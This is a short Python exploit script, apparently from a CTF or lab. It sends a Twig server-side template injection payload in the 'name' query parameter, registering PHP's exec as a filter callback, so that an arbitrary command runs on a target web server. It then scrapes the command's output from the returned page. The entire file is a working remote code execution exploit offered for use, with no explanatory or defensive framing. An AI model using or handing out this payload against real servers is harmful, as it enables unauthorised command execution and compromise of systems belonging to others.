import requests
from lxml import html
import sys

if len(sys.argv) != 3:
    print(f"[-] Usage:\n\tpython3 {sys.argv[0]} <URL> <COMMAND>")
    sys.exit(1)
else:
    url = sys.argv[1]
    command = sys.argv[2]

request = requests.get(url + "/?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('" + command + "')}}")
html_ = html.fromstring(request.content)
command_output = html_.xpath('//h1/text()')[-1].split('\n')[1]
print(command_output)
